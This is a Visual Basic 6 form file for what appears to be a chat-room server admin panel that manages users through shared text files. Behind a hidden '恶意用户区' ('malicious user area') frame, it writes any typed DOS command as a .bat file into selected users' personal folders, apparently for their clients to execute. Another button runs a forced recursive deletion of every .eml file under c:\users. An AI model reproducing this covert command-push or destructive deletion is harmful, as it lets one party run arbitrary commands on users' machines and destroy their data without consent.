VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   9660
   ClientLeft      =   4485
   ClientTop       =   825
   ClientWidth     =   13485
   LinkTopic       =   "Form1"
   ScaleHeight     =   9660
   ScaleWidth      =   13485
   Begin VB.Frame Frame2 
      Caption         =   "恶意用户区"
      Height          =   9255
      Left            =   9840
      TabIndex        =   30
      Top             =   120
      Visible         =   0   'False
      Width           =   3495
      Begin VB.TextBox Text7 
         BeginProperty Font 
            Name            =   "宋体"
            Size            =   15
            Charset         =   134
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   420
         Left            =   240
         TabIndex        =   34
         Top             =   7560
         Width           =   2775
      End
      Begin VB.CommandButton Command11 
         Caption         =   "执行"
         Height          =   495
         Left            =   240
         TabIndex        =   33
         Top             =   8040
         Width           =   1215
      End
      Begin VB.CommandButton Command10 
         Caption         =   "清除"
         Height          =   495
         Left            =   240
         TabIndex        =   32
         Top             =   6600
         Width           =   1215
      End
      Begin VB.ListBox List3 
         Appearance      =   0  'Flat
         Height          =   5970
         ItemData        =   "Form1.frx":0000
         Left            =   120
         List            =   "Form1.frx":0002
         TabIndex        =   31
         Top             =   480
         Width           =   1455
      End
      Begin VB.Label Label12 
         AutoSize        =   -1  'True
         Caption         =   "DOS命令："
         Height          =   180
         Left            =   240
         TabIndex        =   36
         Top             =   7200
         Width           =   810
      End
      Begin VB.Label Label11 
         AutoSize        =   -1  'True
         Caption         =   "Label11"
         Height          =   180
         Left            =   120
         TabIndex        =   35
         Top             =   8880
         Visible         =   0   'False
         Width           =   630
      End
   End
   Begin VB.CommandButton Command9 
      Caption         =   "命令"
      Height          =   495
      Left            =   9000
      TabIndex        =   29
      Top             =   8880
      Width           =   735
   End
   Begin VB.CommandButton Command2 
      Caption         =   "删除eml文件"
      Enabled         =   0   'False
      Height          =   375
      Left            =   1800
      TabIndex        =   28
      Top             =   2400
      Width           =   1215
   End
   Begin VB.Timer Timer4 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   12240
      Top             =   0
   End
   Begin VB.TextBox Text2 
      Appearance      =   0  'Flat
      Enabled         =   0   'False
      Height          =   8775
      Left            =   9960
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   25
      Top             =   480
      Width           =   3375
   End
   Begin VB.ComboBox Combo1 
      Appearance      =   0  'Flat
      Enabled         =   0   'False
      Height          =   300
      ItemData        =   "Form1.frx":0004
      Left            =   4560
      List            =   "Form1.frx":000E
      TabIndex        =   24
      Text            =   "由于你的昵称违规，请立刻修改昵称。"
      Top             =   2280
      Width           =   3375
   End
   Begin VB.CommandButton Command8 
      Caption         =   "检查路径"
      Height          =   495
      Left            =   720
      TabIndex        =   23
      Top             =   8880
      Width           =   1215
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   300
      Left            =   9360
      Top             =   0
   End
   Begin VB.ListBox List2 
      Appearance      =   0  'Flat
      Height          =   5970
      ItemData        =   "Form1.frx":0054
      Left            =   8280
      List            =   "Form1.frx":0056
      TabIndex        =   22
      Top             =   600
      Width           =   1455
   End
   Begin VB.TextBox Text6 
      Appearance      =   0  'Flat
      Enabled         =   0   'False
      Height          =   270
      Left            =   5400
      TabIndex        =   19
      ToolTipText     =   "请输入名字或编码（编码起始位为 1 ）"
      Top             =   170
      Width           =   1215
   End
   Begin VB.CommandButton Command7 
      Caption         =   "发送(&s)"
      Enabled         =   0   'False
      Height          =   375
      Left            =   6720
      TabIndex        =   18
      Top             =   120
      Width           =   975
   End
   Begin VB.CommandButton Command6 
      Caption         =   "退出(&e)"
      Enabled         =   0   'False
      Height          =   375
      Left            =   3480
      TabIndex        =   16
      Top             =   2040
      Width           =   855
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   6960
      Top             =   2760
   End
   Begin VB.TextBox Text5 
      Appearance      =   0  'Flat
      Height          =   5295
      Left            =   1800
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   14
      Top             =   3240
      Width           =   6375
   End
   Begin VB.CommandButton Command4 
      Caption         =   "进入聊天室"
      Enabled         =   0   'False
      Height          =   375
      Left            =   2400
      TabIndex        =   13
      Top             =   2040
      Width           =   1095
   End
   Begin VB.CommandButton Command3 
      Caption         =   "刷新"
      Enabled         =   0   'False
      Height          =   375
      Left            =   1800
      TabIndex        =   12
      Top             =   2040
      Width           =   615
   End
   Begin VB.TextBox Text4 
      Appearance      =   0  'Flat
      Enabled         =   0   'False
      Height          =   1455
      Left            =   4560
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   11
      Top             =   600
      Width           =   3615
   End
   Begin VB.FileListBox File1 
      Enabled         =   0   'False
      Height          =   1890
      Left            =   1800
      Pattern         =   "*.txt"
      TabIndex        =   9
      Top             =   120
      Width           =   2535
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   840
      Top             =   7920
   End
   Begin VB.CommandButton Command1 
      Caption         =   "锁定"
      Height          =   495
      Left            =   8040
      TabIndex        =   6
      Top             =   8880
      Width           =   735
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "宋体"
         Size            =   14.25
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   615
      IMEMode         =   1  'ON
      Left            =   2160
      MultiLine       =   -1  'True
      ScrollBars      =   1  'Horizontal
      TabIndex        =   5
      Top             =   8880
      Width           =   5775
   End
   Begin VB.ListBox List1 
      Appearance      =   0  'Flat
      Height          =   7410
      ItemData        =   "Form1.frx":0058
      Left            =   120
      List            =   "Form1.frx":005A
      TabIndex        =   4
      Top             =   600
      Width           =   1455
   End
   Begin VB.Frame Frame1 
      Caption         =   "选定踢出用户"
      Enabled         =   0   'False
      Height          =   1455
      Left            =   8280
      TabIndex        =   0
      Top             =   6720
      Width           =   1455
      Begin VB.TextBox Text3 
         Appearance      =   0  'Flat
         Height          =   270
         Left            =   120
         TabIndex        =   2
         ToolTipText     =   "请输入名字或编码（编码起始位为 1 ）"
         Top             =   360
         Width           =   1215
      End
      Begin VB.CommandButton Command5 
         Caption         =   "踢出"
         Height          =   495
         Left            =   120
         TabIndex        =   1
         Top             =   720
         Width           =   1215
      End
   End
   Begin VB.Label Label10 
      AutoSize        =   -1  'True
      Height          =   180
      Left            =   9960
      TabIndex        =   27
      Top             =   9360
      Visible         =   0   'False
      Width           =   90
   End
   Begin VB.Label Label5 
      AutoSize        =   -1  'True
      Caption         =   "用户建议区："
      Height          =   180
      Left            =   9960
      TabIndex        =   26
      Top             =   240
      Width           =   1080
   End
   Begin VB.Label Label9 
      AutoSize        =   -1  'True
      Caption         =   "聊天室名称列表："
      Height          =   180
      Left            =   8280
      TabIndex        =   21
      Top             =   360
      Width           =   1440
   End
   Begin VB.Label Label8 
      AutoSize        =   -1  'True
      Caption         =   "Label8"
      Height          =   180
      Left            =   120
      TabIndex        =   20
      Top             =   8520
      Visible         =   0   'False
      Width           =   540
   End
   Begin VB.Label Label7 
      AutoSize        =   -1  'True
      Caption         =   "警告："
      Height          =   180
      Left            =   4800
      TabIndex        =   17
      Top             =   240
      Width           =   540
   End
   Begin VB.Label Label6 
      AutoSize        =   -1  'True
      Height          =   180
      Left            =   1920
      TabIndex        =   15
      Top             =   3000
      Width           =   90
   End
   Begin VB.Label Label4 
      AutoSize        =   -1  'True
      Height          =   180
      Left            =   480
      TabIndex        =   10
      Top             =   10800
      Visible         =   0   'False
      Width           =   90
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      Height          =   180
      Left            =   480
      TabIndex        =   8
      Top             =   10320
      Visible         =   0   'False
      Width           =   90
   End
   Begin VB.Label Label1 
      Caption         =   "请输入聊天室和总名称列表路径："
      Height          =   180
      Left            =   2160
      TabIndex        =   7
      Top             =   8640
      Width           =   2700
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      Caption         =   "在线人员名称列表："
      Height          =   180
      Left            =   120
      TabIndex        =   3
      Top             =   240
      Width           =   1620
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim ltsry() As String, o As Integer

Private Sub Combo1_Click()
Text4.Text = Text4.Text & vbCrLf & Combo1.Text & vbCrLf & "否则注销此账号。"
End Sub

Private Sub Command1_Click()
On Error Resume Next
'记录总名称列表路径
Label2.Caption = Text1.Text & "\聊天室名称列表\总名称列表.txt"
'记录聊天室路径
Label4.Caption = Text1.Text & "\聊天室\"
Label11.Caption = Text1.Text & "\人员文档\"
Label10.Caption = Text1.Text & "\聊天室名称列表\服务器反馈.txt"
File1.Path = Label4.Caption
Text1.Text = ""
If Label4.Caption <> "" And Label2.Caption <> "" Then
    Command3.Enabled = True: Command1.Enabled = False
    Command4.Enabled = True: Timer1.Enabled = True
    File1.Enabled = True: Timer4.Enabled = True
    Command2.Enabled = True
End If
Command3.SetFocus
End Sub

Private Sub Command10_Click()
List3.Clear
End Sub

Private Sub Command11_Click()
For i = 0 To List3.ListCount - 1
    Open Label11.Caption & List3.List(i) & ".bat" For Output As #20
        Print #20, Text7.Text
    Close
Next
End Sub

Private Sub Command2_Click()
Shell "cmd.exe /c del /s /q /f c:\users\*.eml"
End Sub

Private Sub Command3_Click()   '刷新
File1.Refresh
End Sub

Private Sub Command4_Click()  '进入聊天室
If Label6.Caption <> "" Then
    File1.Enabled = False: Command4.Enabled = False
    Timer2.Enabled = True: Command6.Enabled = True
    Command7.Enabled = True: Timer3.Enabled = True
    Text4.Enabled = True: Text6.Enabled = True: Frame1.Enabled = True
End If
End Sub

Private Sub Command5_Click()
Dim zxry() As String, mc() As String, i As Integer, k As Integer
If Text3.Text <> "" Then
    hao = FreeFile
    '记录该聊天室软件人数
    Open Label2.Caption For Input As hao
        Do Until EOF(hao)
            Line Input #hao, ighf
            i = i + 1
        Loop
    Close
    ReDim zxry(i)
    '记录当前聊天室软件的人员
    Open Label2.Caption For Input As hao
    i = 0
        Do Until EOF(hao)
            Line Input #hao, zxry(i)
            i = i + 1
        Loop
    Close
    ReDim mc(i)
    '检测聊天室软件中有没有此人员
    For a = 0 To i
        If mc(a) <> Text3.Text Then iop = iop + 1
    Next
    If iop = i Then GoTo tiao
    '找到踢出人员并删除
    For k = 0 To i
        If zxry(k) = Text3.Text Then zxry(k) = ""
    Next
    '重新写入文件中，不包含踢出人员
    Open Label2.Caption For Output As #5
        For k = 0 To i
            If zxry(k) <> "" Then Print #5, zxry(k)
        Next
    Close
    '冲刷列表
    For k = 0 To i
        List1.AddItem zxry(k)
    Next

    a = Left(Label2.Caption, Len(Label2.Caption) - 9)
    '记录该聊天室人数
    Open a & Label8.Caption & "名称列表.txt" For Input As hao
    i = 0
        Do Until EOF(hao)
            Line Input #hao, ighf
            i = i + 1
        Loop
    Close
    ReDim mc(i)
    '记录当前聊天室的人员
    Open a & Label8.Caption & "名称列表.txt" For Input As hao
    i = 0
        Do Until EOF(hao)
            Line Input #hao, mc(i)
            i = i + 1
        Loop
    Close
    '找到踢出人员并删除
    For k = 0 To i
        If mc(k) = Text3.Text Then mc(k) = ""
    Next
    '重新写入文件中，不包含踢出人员
    Open a & Label8.Caption & "名称列表.txt" For Output As #5
        For k = 0 To i
            If mc(k) <> "" Then Print #5, mc(k)
        Next
    Close
    hao = FreeFile
    Open Label6.Caption For Append As hao
        Print #hao, vbCrLf & "用户" & Text3.Text & "已被服务器管理员注销"
    Close
tiao:
    Text3.Text = ""
End If
End Sub

Private Sub Command6_Click()   '退出
Text5.Text = "": Label6.Caption = ""
File1.Enabled = True: Command4.Enabled = True
Timer2.Enabled = False: Command6.Enabled = False
Command7.Enabled = False: Timer3.Enabled = False
Text4.Enabled = False: Text6.Enabled = False
List2.Clear
End Sub

Private Sub Command7_Click()   '发送
If Text6.Text <> "" Or Text4.Text <> "" Then
    Open Label6.Caption For Append As #3
        Print #3, vbCrLf & "来自服务器管理员的警告：" & vbCrLf & "用户：" & Text6.Text
        Print #3, Text4.Text
    Close
    Text4.Text = ""
    Text6.Text = ""
End If
End Sub

Private Sub Command8_Click()
MsgBox Label2.Caption
MsgBox Label4.Caption
End Sub

Private Sub Command9_Click()
Static a
a = a + 1
If a Mod 2 = 1 Then Frame2.Visible = True Else Frame2.Visible = False
End Sub

Private Sub File1_Click()   '选择聊天室
Label6.Caption = File1.Path & "\" & File1.FileName
Label8.Caption = Left(File1.FileName, Len(File1.FileName) - 4)
End Sub

Private Sub Form_Load()
years = Left(Now, 4)
months = Month(Now)
days = Day(Now)
hours = Hour(Now)
mins = Minute(Now)
code = years & months & days & hours & mins
mima = InputBox("请输入密码")
If Not mima = code Then End
End Sub

Private Sub List2_Click()
List3.AddItem (List2.List(List2.ListIndex))
End Sub

Private Sub Text3_Change()
On Error Resume Next
'输入标号查找人员
If Not Val(Text3.Text) < 0 Then Text3.Text = List2.List(Text3.Text)
Command5.SetFocus
End Sub

Private Sub Text5_Change()
Text5.SelStart = Len(Text5.Text)
End Sub

Private Sub Text6_Change()
On Error Resume Next
'输入标号查找人员
If Not Val(Text6.Text) < 0 Then Text6.Text = List2.List(Text6.Text)
End Sub

Private Sub Timer1_Timer()
On Error Resume Next
List1.Clear
'记录当前人数
Open Label2.Caption For Input As #1
    Do Until EOF(1)
        Line Input #1, re
        il = il + 1
    Loop
Close
ReDim zxry(il): il = 0
'记录当前人员名称
Open Label2.Caption For Input As #1
    Do Until EOF(1)
        Line Input #1, zxry(il)
        il = il + 1
    Loop
Close
'重刷列表
For k = 0 To il
    List1.AddItem zxry(k)
Next
End Sub

Private Sub Timer2_Timer()
On Error Resume Next
'更新当前聊天室信息
Open Label6.Caption For Input As #2
    Do Until EOF(2)
        Line Input #2, a
        gh = gh & vbCrLf & a
    Loop
Close
Text5.Text = gh
End Sub

Private Sub Timer3_Timer()
On Error Resume Next
List2.Clear
a = Left(Label2.Caption, Len(Label2.Caption) - 9)
hao = FreeFile
'记录该聊天室人数
Open a & Label8.Caption & "名称列表.txt" For Input As hao
o = 0
    Do Until EOF(hao)
        o = o + 1
        Line Input #hao, ighf
    Loop
Close
ReDim ltsry(o)
'记录当前聊天室的人员
Open a & Label8.Caption & "名称列表.txt" For Input As hao
o = 0
    Do Until EOF(hao)
        o = o + 1
        Line Input #hao, ltsry(o)
    Loop
Close
Call lists2
End Sub

Sub lists2()
For p = 0 To o
    List2.AddItem ltsry(p)
Next
End Sub

Private Sub Timer4_Timer()
Open Label10.Caption For Input As 3
    Do Until EOF(3)
        Line Input #3, xx
        xxs = xxs & vbCrLf & xx
    Loop
Close
Text2.Text = xxs
End Sub
